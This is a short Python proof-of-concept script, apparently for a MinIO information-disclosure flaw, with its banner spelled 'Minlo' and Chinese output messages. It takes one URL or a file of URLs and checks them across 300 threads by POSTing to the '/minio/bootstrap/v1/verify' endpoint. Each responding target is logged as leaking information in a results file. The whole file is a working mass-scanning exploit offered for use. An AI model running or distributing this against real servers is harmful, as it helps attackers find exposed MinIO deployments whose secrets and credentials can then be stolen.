import sys, re, requests, argparse, time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    banner = """Minlo"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="Minlo信息泄露")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tuage:python {sys.argv[0]} -h")
def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = "/minio/bootstrap/v1/verify"
    url = target + payload
    try:
        res1 = requests.get(url=target, verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=url, headers=headers, timeout=5, verify=False)
            if res2.status_code == 200:
                print(f'[+]该{target}存在信息泄露')
                with open('M_result.txt', 'a', encoding='utf-8') as fp:
                    fp.write(target + '\n')
                    return True
            else:
                print(f'[-]该{target}不存在信息泄露')
                return False
    except Exception as e:
        print(f'该url{target}存在问题，请手动测试')
if __name__ == '__main__':
    main()